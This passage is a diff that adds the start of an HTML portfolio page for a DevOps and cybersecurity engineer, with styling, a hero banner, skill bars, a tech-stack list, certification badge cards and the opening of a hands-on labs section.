@@ -1,0 +1,2209 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xT4I - DevOps & Cyber Security Portfolio</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Marked.js for Markdown parsing -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        mono: ['JetBrains Mono', 'monospace'],
+                        sans: ['IBM Plex Sans', 'sans-serif']
+                    },
+                    colors: {
+                        primary: '#7C3AED',      // Purple from logo
+                        secondary: '#06B6D4',    // Cyan
+                        accent: '#A78BFA',       // Light purple
+                        dark: {
+                            900: '#0A0A0F',
+                            800: '#121218',
+                            700: '#1A1A24',
+                            600: '#2D2D3A'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        * {
+            font-family: 'IBM Plex Sans', sans-serif;
+        }
+
+        h1, h2, h3, h4, h5, h6, .mono {
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        body {
+            background-color: #0A0A0F;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Light mode styles */
+        html.light body {
+            background-color: #F8FAFC;
+        }
+
+        html.light .bg-dark-900 { background-color: #FFFFFF !important; }
+        html.light .bg-dark-800 { background-color: #F8FAFC !important; }
+        html.light .bg-dark-800\/50 { background-color: rgba(255, 255, 255, 0.8) !important; }
+        html.light .bg-dark-800\/80 { background-color: rgba(255, 255, 255, 0.9) !important; }
+        html.light .bg-dark-800\/30 { background-color: #F1F5F9 !important; }
+        html.light .bg-dark-700 { background-color: #E2E8F0 !important; }
+        html.light .bg-dark-700\/50 { background-color: rgba(226, 232, 240, 0.5) !important; }
+
+        html.light .text-gray-100 { color: #1E293B !important; }
+        html.light .text-gray-200 { color: #334155 !important; }
+        html.light .text-gray-300 { color: #475569 !important; }
+        html.light .text-gray-400 { color: #64748B !important; }
+        html.light .text-gray-500 { color: #94A3B8 !important; }
+
+        html.light .border-dark-700 { border-color: #E2E8F0 !important; }
+        html.light .border-primary\/20 { border-color: rgba(124, 58, 237, 0.3) !important; }
+        html.light .border-secondary\/20 { border-color: rgba(6, 182, 212, 0.3) !important; }
+
+        html.light .glass {
+            background: rgba(255, 255, 255, 0.95) !important;
+            border: 1px solid rgba(124, 58, 237, 0.2) !important;
+        }
+
+        html.light .code-block {
+            background: #F1F5F9 !important;
+            border-color: rgba(124, 58, 237, 0.2) !important;
+        }
+
+        html.light .modal {
+            background: rgba(248, 250, 252, 0.95) !important;
+        }
+
+        html.light .modal-content {
+            background: #FFFFFF !important;
+            border-color: rgba(124, 58, 237, 0.3) !important;
+        }
+
+        /* Neon glow effects */
+        .glow-purple {
+            text-shadow: 0 0 20px rgba(124, 58, 237, 0.5), 0 0 40px rgba(124, 58, 237, 0.3);
+        }
+
+        .glow-cyan {
+            text-shadow: 0 0 20px rgba(6, 182, 212, 0.5), 0 0 40px rgba(6, 182, 212, 0.3);
+        }
+
+        .border-glow {
+            box-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
+        }
+
+        .card-hover {
+            transition: all 0.3s ease-out;
+        }
+
+        .card-hover:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 0 30px rgba(124, 58, 237, 0.4);
+        }
+
+        /* Terminal cursor animation */
+        .terminal-cursor::after {
+            content: '|';
+            animation: blink 1s infinite;
+            color: #06B6D4;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Scanline effect (subtle) */
+        .scanline::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                transparent 50%,
+                rgba(6, 182, 212, 0.02) 50%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Respect reduced motion */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+            .terminal-cursor::after {
+                animation: none;
+            }
+        }
+
+        /* Grid pattern background */
+        .grid-bg {
+            background-image:
+                linear-gradient(rgba(124, 58, 237, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(124, 58, 237, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            overflow-y: auto;
+        }
+
+        .modal.active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal-content {
+            background: #121218;
+            border: 1px solid rgba(124, 58, 237, 0.3);
+            border-radius: 1rem;
+            max-width: 900px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Badge hover effects */
+        .badge-card {
+            transition: all 0.3s ease-out;
+            cursor: pointer;
+        }
+
+        .badge-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 40px rgba(124, 58, 237, 0.5);
+        }
+
+        /* Code block styling */
+        .code-block {
+            background: #0A0A0F;
+            border: 1px solid rgba(6, 182, 212, 0.2);
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body class="bg-dark-900 text-gray-100">
+    <!-- Navigation -->
+    <nav class="fixed top-4 left-4 right-4 z-50">
+        <div class="max-w-7xl mx-auto bg-dark-800/80 backdrop-blur-lg rounded-2xl border border-primary/20 px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <img src="181613976.png" alt="0xT4I Logo" class="w-12 h-12">
+                    <div>
+                        <span class="text-xl font-mono font-bold text-primary glow-purple">0xT4I</span>
+                        <p class="text-xs text-gray-400">Tai Huu Nguyen</p>
+                    </div>
+                </div>
+                <div class="hidden md:flex items-center space-x-6">
+                    <a href="#about" class="text-gray-300 hover:text-secondary transition-colors duration-200 font-mono text-sm">$ about</a>
+                    <a href="#projects" class="text-gray-300 hover:text-secondary transition-colors duration-200 font-mono text-sm">$ projects</a>
+                    <a href="#blog" class="text-gray-300 hover:text-secondary transition-colors duration-200 font-mono text-sm">$ blog</a>
+                    <a href="#contact" class="text-gray-300 hover:text-secondary transition-colors duration-200 font-mono text-sm">$ contact</a>
+
+                    <!-- Dark/Light Mode Toggle -->
+                    <button id="theme-toggle" class="text-gray-300 hover:text-secondary transition-colors duration-200 cursor-pointer" aria-label="Toggle theme">
+                        <svg id="theme-toggle-dark-icon" class="w-5 h-5 hidden" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
+                        </svg>
+                        <svg id="theme-toggle-light-icon" class="w-5 h-5 hidden" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                        </svg>
+                    </button>
+
+                    <a href="https://github.com/0xt4i" target="_blank" class="bg-primary/20 hover:bg-primary/30 text-primary border border-primary/40 px-4 py-2 rounded-lg transition-all duration-200 cursor-pointer font-mono text-sm">
+                        GitHub
+                    </a>
+                </div>
+                <!-- Mobile menu button -->
+                <button class="md:hidden text-gray-100 cursor-pointer">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="relative min-h-screen flex items-center justify-center px-4 sm:px-6 lg:px-8 pt-24 pb-16 overflow-hidden grid-bg">
+        <!-- Animated background elements -->
+        <div class="absolute top-20 left-10 w-96 h-96 bg-primary/10 rounded-full blur-3xl animate-pulse"></div>
+        <div class="absolute bottom-20 right-10 w-96 h-96 bg-secondary/10 rounded-full blur-3xl animate-pulse" style="animation-delay: 1s;"></div>
+
+        <div class="relative max-w-6xl mx-auto text-center scanline">
+            <div class="space-y-6">
+                <!-- Terminal prompt style -->
+                <div class="inline-block bg-dark-800/50 backdrop-blur-sm border border-secondary/30 rounded-lg px-6 py-3 mb-4">
+                    <span class="text-secondary font-mono text-sm">root@0xT4I:~#</span>
+                    <span class="text-gray-300 font-mono text-sm ml-2">whoami</span>
+                </div>
+
+                <h1 class="text-5xl sm:text-6xl lg:text-7xl font-mono font-bold leading-tight">
+                    <span class="text-gray-100">I'm </span>
+                    <span class="text-primary glow-purple">Tai Huu Nguyen</span>
+                </h1>
+
+                <div class="flex items-center justify-center space-x-2 text-2xl sm:text-3xl lg:text-4xl font-mono text-secondary glow-cyan">
+                    <span>&gt;</span>
+                    <span class="terminal-cursor">DevOps Engineer & Cyber Security Specialist</span>
+                </div>
+
+                <p class="text-lg sm:text-xl text-gray-400 max-w-3xl mx-auto leading-relaxed">
+                    Building secure, scalable infrastructure and defending against cyber threats.
+                    Passionate about automation, container orchestration, and offensive security research.
+                </p>
+
+                <div class="flex flex-wrap gap-3 justify-center pt-4">
+                    <span class="bg-dark-800 border border-primary/30 text-primary px-4 py-2 rounded-lg font-mono text-sm">
+                        DevOps
+                    </span>
+                    <span class="bg-dark-800 border border-secondary/30 text-secondary px-4 py-2 rounded-lg font-mono text-sm">
+                        Kubernetes
+                    </span>
+                    <span class="bg-dark-800 border border-primary/30 text-primary px-4 py-2 rounded-lg font-mono text-sm">
+                        Security
+                    </span>
+                    <span class="bg-dark-800 border border-secondary/30 text-secondary px-4 py-2 rounded-lg font-mono text-sm">
+                        Docker
+                    </span>
+                    <span class="bg-dark-800 border border-primary/30 text-primary px-4 py-2 rounded-lg font-mono text-sm">
+                        CI/CD
+                    </span>
+                    <span class="bg-dark-800 border border-secondary/30 text-secondary px-4 py-2 rounded-lg font-mono text-sm">
+                        AWS
+                    </span>
+                    <span class="bg-dark-800 border border-primary/30 text-primary px-4 py-2 rounded-lg font-mono text-sm">
+                        Penetration Testing
+                    </span>
+                </div>
+
+                <div class="flex flex-col sm:flex-row gap-4 justify-center items-center pt-8">
+                    <a href="#projects" class="bg-primary hover:bg-primary/80 text-white px-8 py-4 rounded-lg font-mono shadow-lg border-glow transition-all duration-200 cursor-pointer">
+                        View Projects
+                    </a>
+                    <a href="#contact" class="bg-dark-800/80 backdrop-blur-sm hover:bg-dark-700 text-gray-100 px-8 py-4 rounded-lg font-mono border border-secondary/40 hover:border-secondary transition-all duration-200 cursor-pointer">
+                        Get In Touch
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="py-20 px-4 sm:px-6 lg:px-8 bg-dark-800/30">
+        <div class="max-w-7xl mx-auto">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> About Me
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary"></div>
+            </div>
+
+            <div class="grid lg:grid-cols-2 gap-12">
+                <div class="space-y-6">
+                    <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6">
+                        <h3 class="text-2xl font-mono font-semibold text-primary mb-4">$ cat profile.txt</h3>
+                        <div class="space-y-3 text-gray-300 leading-relaxed">
+                            <p>
+                                DevOps Engineer with a strong background in cybersecurity and infrastructure automation.
+                                I specialize in building resilient, scalable systems while maintaining security best practices.
+                            </p>
+                            <p>
+                                My expertise spans cloud infrastructure (AWS, Azure, GCP), container orchestration (Kubernetes, Docker),
+                                CI/CD pipelines (Jenkins, GitLab CI, GitHub Actions), and Infrastructure as Code (Terraform, Ansible).
+                            </p>
+                            <p>
+                                On the security side, I conduct penetration testing, vulnerability assessments, and security audits.
+                                I'm passionate about offensive security research and contributing to open-source security tools.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="bg-dark-800/50 backdrop-blur-sm border border-secondary/20 rounded-xl p-6">
+                        <h3 class="text-2xl font-mono font-semibold text-secondary mb-4">$ certifications --list</h3>
+                        <ul class="space-y-3 text-gray-300">
+                            <li class="flex items-start">
+                                <svg class="w-6 h-6 text-primary mr-3 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                                <span class="font-mono">AWS Certified Solutions Architect</span>
+                            </li>
+                            <li class="flex items-start">
+                                <svg class="w-6 h-6 text-primary mr-3 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                                <span class="font-mono">Certified Kubernetes Administrator (CKA)</span>
+                            </li>
+                            <li class="flex items-start">
+                                <svg class="w-6 h-6 text-primary mr-3 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                                <span class="font-mono">Offensive Security Certified Professional (OSCP)</span>
+                            </li>
+                            <li class="flex items-start">
+                                <svg class="w-6 h-6 text-primary mr-3 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                                </svg>
+                                <span class="font-mono">CompTIA Security+</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="space-y-6">
+                    <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6">
+                        <h3 class="text-2xl font-mono font-semibold text-primary mb-4">$ skills --verbose</h3>
+
+                        <div class="space-y-4">
+                            <div>
+                                <div class="flex justify-between mb-2">
+                                    <span class="text-gray-300 font-mono text-sm">DevOps & Cloud</span>
+                                    <span class="text-secondary font-mono text-sm">95%</span>
+                                </div>
+                                <div class="h-2 bg-dark-700 rounded-full overflow-hidden">
+                                    <div class="h-full bg-gradient-to-r from-primary to-secondary" style="width: 95%"></div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <div class="flex justify-between mb-2">
+                                    <span class="text-gray-300 font-mono text-sm">Container Orchestration</span>
+                                    <span class="text-secondary font-mono text-sm">90%</span>
+                                </div>
+                                <div class="h-2 bg-dark-700 rounded-full overflow-hidden">
+                                    <div class="h-full bg-gradient-to-r from-primary to-secondary" style="width: 90%"></div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <div class="flex justify-between mb-2">
+                                    <span class="text-gray-300 font-mono text-sm">Security & Penetration Testing</span>
+                                    <span class="text-secondary font-mono text-sm">88%</span>
+                                </div>
+                                <div class="h-2 bg-dark-700 rounded-full overflow-hidden">
+                                    <div class="h-full bg-gradient-to-r from-primary to-secondary" style="width: 88%"></div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <div class="flex justify-between mb-2">
+                                    <span class="text-gray-300 font-mono text-sm">Infrastructure as Code</span>
+                                    <span class="text-secondary font-mono text-sm">92%</span>
+                                </div>
+                                <div class="h-2 bg-dark-700 rounded-full overflow-hidden">
+                                    <div class="h-full bg-gradient-to-r from-primary to-secondary" style="width: 92%"></div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <div class="flex justify-between mb-2">
+                                    <span class="text-gray-300 font-mono text-sm">CI/CD Pipelines</span>
+                                    <span class="text-secondary font-mono text-sm">87%</span>
+                                </div>
+                                <div class="h-2 bg-dark-700 rounded-full overflow-hidden">
+                                    <div class="h-full bg-gradient-to-r from-primary to-secondary" style="width: 87%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-dark-800/50 backdrop-blur-sm border border-secondary/20 rounded-xl p-6">
+                        <h3 class="text-2xl font-mono font-semibold text-secondary mb-4">$ tech_stack.json</h3>
+                        <pre class="text-gray-300 text-sm overflow-x-auto"><code>{
+  "cloud": ["AWS", "Azure", "GCP", "DigitalOcean"],
+  "containers": ["Docker", "Kubernetes", "Podman"],
+  "iac": ["Terraform", "Ansible", "CloudFormation"],
+  "cicd": ["Jenkins", "GitLab CI", "GitHub Actions"],
+  "monitoring": ["Prometheus", "Grafana", "ELK Stack"],
+  "security": ["Burp Suite", "Metasploit", "Nmap", "Wireshark"],
+  "languages": ["Python", "Go", "Bash", "JavaScript"]
+}</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Certifications & Badges Gallery Section -->
+    <section id="certifications" class="py-20 px-4 sm:px-6 lg:px-8">
+        <div class="max-w-7xl mx-auto">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> Certifications & Achievements
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary"></div>
+                <p class="text-gray-400 mt-4 font-mono text-sm">
+                    Click on any badge to read my journey and hands-on experience
+                </p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
+                <!-- AWS Certification Badge -->
+                <div class="badge-card bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6 text-center" onclick="openModal('aws-cert')">
+                    <div class="bg-gradient-to-br from-orange-500/20 to-orange-600/20 rounded-lg p-8 mb-4">
+                        <svg class="w-20 h-20 mx-auto text-orange-500" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M6.763 10.036c0 .296.032.535.088.71.064.176.144.368.256.576.04.063.056.127.056.183 0 .08-.048.16-.152.24l-.503.335c-.072.048-.144.072-.208.072-.08 0-.16-.04-.239-.112-.112-.12-.207-.248-.279-.384-.072-.144-.144-.304-.224-.488-.56.66-1.263.988-2.095.988-.599 0-1.079-.17-1.431-.517-.353-.344-.528-.804-.528-1.375 0-.608.215-1.103.656-1.471.44-.368 1.023-.552 1.759-.552.247 0 .503.016.76.056.264.04.535.088.815.152v-.503c0-.52-.104-.887-.32-1.095-.208-.208-.568-.312-1.088-.312-.24 0-.487.032-.744.08-.255.048-.503.12-.735.2-.112.04-.191.064-.247.072-.056.008-.096.016-.128.016-.112 0-.168-.08-.168-.248v-.391c0-.128.016-.224.056-.28.04-.056.112-.104.216-.152.24-.127.527-.231.855-.328.336-.096.687-.144 1.063-.144.808 0 1.399.184 1.783.56.376.368.568.927.568 1.679v2.207zm-2.894 1.087c.24 0 .487-.04.751-.127.264-.088.496-.256.696-.512.12-.151.207-.32.256-.506.048-.184.08-.407.08-.662v-.32c-.216-.047-.44-.087-.671-.111-.231-.024-.455-.04-.671-.04-.479 0-.831.096-1.055.287-.224.192-.336.463-.336.807 0 .328.08.575.247.743.16.175.431.255.743.255zm5.783 1.535c-.144 0-.24-.024-.304-.08-.064-.048-.12-.16-.168-.311L7.586 5.55c-.048-.16-.072-.264-.072-.32 0-.128.064-.2.191-.2h.783c.151 0 .255.025.311.08.064.048.112.16.16.312l1.343 5.295 1.247-5.295c.04-.16.088-.264.151-.312.064-.048.175-.08.319-.08h.64c.151 0 .255.025.319.08.064.048.12.16.151.312l1.264 5.358 1.383-5.358c.048-.16.104-.264.16-.312.063-.048.167-.08.311-.08h.743c.128 0 .2.065.2.2 0 .04-.009.08-.017.128-.008.048-.024.12-.056.216l-1.927 6.717c-.048.16-.104.263-.168.311-.064.056-.168.08-.312.08h-.687c-.151 0-.255-.024-.319-.08-.064-.048-.12-.159-.151-.311L13.48 7.558l-1.231 5.286c-.04.16-.088.264-.151.312-.064.056-.175.08-.32.08h-.687zm9.207.191c-.735 0-1.471-.088-2.127-.256-.655-.168-1.159-.368-1.511-.599-.127-.088-.215-.184-.247-.28-.032-.096-.056-.2-.056-.312v-.407c0-.168.064-.248.183-.248.048 0 .096.008.144.024.048.016.12.048.2.08.271.12.559.215.855.279.304.072.6.104.903.104.506 0 .895-.088 1.167-.264.271-.176.415-.423.415-.743 0-.216-.064-.4-.2-.543-.135-.144-.431-.272-.791-.4l-1.135-.36c-.575-.183-1-.455-1.247-.807-.247-.353-.375-.743-.375-1.168 0-.336.072-.631.216-.895.144-.264.336-.487.575-.671.24-.184.52-.32.848-.415.327-.096.679-.136 1.054-.136.144 0 .296.008.44.024.151.016.296.04.431.064.128.024.255.056.375.088.12.032.216.064.287.096.104.048.183.096.232.151.048.049.08.136.08.256v.375c0 .168-.064.256-.184.256-.063 0-.167-.024-.303-.08-.48-.216-1.023-.32-1.631-.32-.455 0-.815.072-1.055.216-.24.144-.36.368-.36.679 0 .216.072.407.215.559.144.151.44.287.808.415l1.111.36c.567.183.983.439 1.223.767.24.329.36.703.36 1.119 0 .343-.072.655-.207.927-.144.272-.336.511-.591.703-.248.2-.559.343-.927.447-.36.111-.767.167-1.222.167z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-lg font-mono font-semibold text-gray-100 mb-2">AWS Solutions Architect</h3>
+                    <p class="text-gray-400 text-sm mb-2">Associate Level</p>
+                    <p class="text-xs font-mono text-gray-500 mb-3">Cloud Infrastructure Path • 1/2</p>
+                    <span class="inline-block bg-primary/20 text-primary px-3 py-1 rounded-full text-xs font-mono">Click to read story</span>
+                </div>
+
+                <!-- Kubernetes CKA Badge -->
+                <div class="badge-card bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6 text-center" onclick="openModal('cka-cert')">
+                    <div class="bg-gradient-to-br from-blue-500/20 to-blue-600/20 rounded-lg p-8 mb-4">
+                        <svg class="w-20 h-20 mx-auto text-blue-500" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M10.204 14.35l.007.01-.999 2.413a5.171 5.171 0 0 1-2.075-2.597l2.578-.437.004.005a.44.44 0 0 1 .484.606zm-.833-2.129a.44.44 0 0 0 .173-.756l.002-.011-1.996-1.599a5.18 5.18 0 0 0-.342 3.528l2.168-.372-.005-.01a.44.44 0 0 0-.001-.78zm8.341-3.584a.44.44 0 0 0 .609-.031l.004-.005 1.91-1.505a5.191 5.191 0 0 0-3.671-1.315l-.039 2.647.006.001a.44.44 0 0 0 .18.208zm-1.904 2.73a.44.44 0 0 0 .145-.77l.003-.005-.604-2.441a5.19 5.19 0 0 0-2.628 1.997l2.084 1.217-.001.011a.44.44 0 0 0 .999-.009zm-5.488-1.958a.44.44 0 0 0 .35-.736l-.004-.005-1.651-2.074a5.183 5.183 0 0 0-2.656 2.008l2.625 1.476.006-.001a.44.44 0 0 0 .33-.668zm-3.338 6.121l.008.009.02 2.465a5.185 5.185 0 0 0 3.474-.89l-1.612-2.05-.002.001a.44.44 0 0 0-.717-.007l-.171.472zm8.657-5.093a.44.44 0 0 0-.411-.763l-.008.002-2.635.459a5.194 5.194 0 0 0 .035 3.649l2.594-1.517.002-.009a.44.44 0 0 0 .423-.821zm-.964 4.784l.006.009 1.602 2.056a5.173 5.173 0 0 0 2.06-2.601l-2.578-.438-.004.005a.44.44 0 0 0-.609.031l-.477 .938zm-7.004-4.37a.44.44 0 0 0-.144.766l-.005.008.64 2.436a5.19 5.19 0 0 0 2.63-1.99l-2.121-1.22zm7.046-1.175a.44.44 0 0 0 .015-.979l.007-.006-.604-2.381a5.183 5.183 0 0 0-3.522.899l1.626 2.06.004-.005a.44.44 0 0 0 .749.014l.725-1.602z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-lg font-mono font-semibold text-gray-100 mb-2">Certified Kubernetes Admin</h3>
+                    <p class="text-gray-400 text-sm mb-2">CKA</p>
+                    <p class="text-xs font-mono text-gray-500 mb-3">Cloud Infrastructure Path • 2/2</p>
+                    <span class="inline-block bg-primary/20 text-primary px-3 py-1 rounded-full text-xs font-mono">Click to read story</span>
+                </div>
+
+                <!-- OSCP Badge -->
+                <div class="badge-card bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6 text-center" onclick="openModal('oscp-cert')">
+                    <div class="bg-gradient-to-br from-red-500/20 to-red-600/20 rounded-lg p-8 mb-4">
+                        <svg class="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-lg font-mono font-semibold text-gray-100 mb-2">Offensive Security</h3>
+                    <p class="text-gray-400 text-sm mb-2">OSCP</p>
+                    <p class="text-xs font-mono text-gray-500 mb-3">Security Path • 1/2</p>
+                    <span class="inline-block bg-secondary/20 text-secondary px-3 py-1 rounded-full text-xs font-mono">Click to read story</span>
+                </div>
+
+                <!-- CompTIA Security+ Badge -->
+                <div class="badge-card bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl p-6 text-center" onclick="openModal('security-plus')">
+                    <div class="bg-gradient-to-br from-green-500/20 to-green-600/20 rounded-lg p-8 mb-4">
+                        <svg class="w-20 h-20 mx-auto text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                        </svg>
+                    </div>
+                    <h3 class="text-lg font-mono font-semibold text-gray-100 mb-2">CompTIA Security+</h3>
+                    <p class="text-gray-400 text-sm mb-2">Certified</p>
+                    <p class="text-xs font-mono text-gray-500 mb-3">Security Path • 2/2</p>
+                    <span class="inline-block bg-secondary/20 text-secondary px-3 py-1 rounded-full text-xs font-mono">Click to read story</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Hands-On Projects & Labs Section -->
+    <section id="hands-on" class="py-20 px-4 sm:px-6 lg:px-8 bg-dark-800/30">
+        <div class="max-w-7xl mx-auto">
+            <div class="mb-12">
+                <h2 class="text-4xl sm:text-5xl font-mono font-bold text-gray-100 mb-2">
+                    <span class="text-secondary">#</span> Hands-On Labs & Tutorials
+                </h2>
+                <div class="h-1 w-24 bg-gradient-to-r from-primary to-secondary"></div>
+                <p class="text-gray-400 mt-4">
+                    Step-by-step walkthroughs of real-world projects and security labs
+                </p>
+            </div>
+
+            <div class="space-y-8">
+                <!-- Lab 1: LocalStack CI/CD -->
+                <div class="bg-dark-800/50 backdrop-blur-sm border border-primary/20 rounded-xl overflow-hidden card-hover cursor-pointer" onclick="openModal('lab-localstack')">
+                    <div class="md:flex">
+                        <div class="md:w-1/3 bg-gradient-to-br from-primary/20 to-secondary/20 p-8 flex items-center justify-center">
+                            <svg class="w-32 h-32 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/>
+                            </svg>
+                        </div>
+                        <div class="p-8 md:w-2/3">
+                            <div class="flex items-center space-x-2 mb-4">
+                                <span class="bg-primary/20 text-primary px-3 py-1 rounded font-mono text-sm">DevOps</span>
+                                <span class="bg-secondary/20 text-secondary px-3 py-1 rounded font-mono text-sm">CI/CD</span>
+                            </div>
+                            <h3 class="text-2xl font-mono font-semibold text-gray-100 mb-4">
+                                Building LocalStack CI/CD Pipeline from Scratch
+                            </h3>
+                            <p class="text-gray-400 leading-relaxed mb-4">
+                                Complete walkthrough of setting up a production-grade CI/CD pipeline using LocalStack,
+                                Terraform, and Ansible. Includes infrastructure as code, automated testing, and deployment strategies.
+                            </p>
